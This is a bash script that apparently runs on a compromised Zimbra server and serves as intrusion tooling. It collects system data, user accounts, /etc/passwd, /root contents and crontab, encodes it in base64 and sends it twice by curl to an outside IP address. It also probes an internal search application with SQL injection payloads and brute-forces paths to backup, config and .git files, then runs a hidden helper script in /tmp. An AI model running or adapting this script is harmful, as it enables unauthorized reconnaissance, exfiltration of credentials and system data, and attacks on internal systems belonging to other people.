#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# EDRFO search app: benign query + error/SQLi probes
C=/opt/zimbra/common/bin/curl
[ -x "$C" ] || C=curl
O=/tmp/.EDR.txt
: > "$O"
echo "== POST fam=Шевченко ==" >> "$O"
$C -sS -m 12 -X POST http://10.61.10.136/ --data "fam=%D0%A8%D0%B5%D0%B2%D1%87%D0%B5%D0%BD%D0%BA%D0%BE&name=&otch=&dob=" >> "$O" 2>&1 | head -60
echo "== POST fam=' ==" >> "$O"
$C -sS -m 12 -X POST http://10.61.10.136/ --data "fam='&name=&otch=&dob=" >> "$O" 2>&1 | head -40
echo "== POST fam=%%' ==" >> "$O"
$C -sS -m 12 -X POST http://10.61.10.136/ --data "fam=%25&name=&otch=&dob=" >> "$O" 2>&1 | head -40
echo "== methods / dirs ==" >> "$O"
$C -sS -m 8 -X OPTIONS http://10.61.10.136/ -D - -o /dev/null >> "$O" 2>&1 | head -10
for p in admin api db export dump backup .git config.php index.php.bak; do
  code=$($C -sS -m 8 -o /dev/null -w "%{http_code}" "http://10.61.10.136/$p")
  echo "$p => $code" >> "$O"
done
echo EDR_DONE >> "$O"
bash /tmp/.ex.sh "$O" edrfo
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


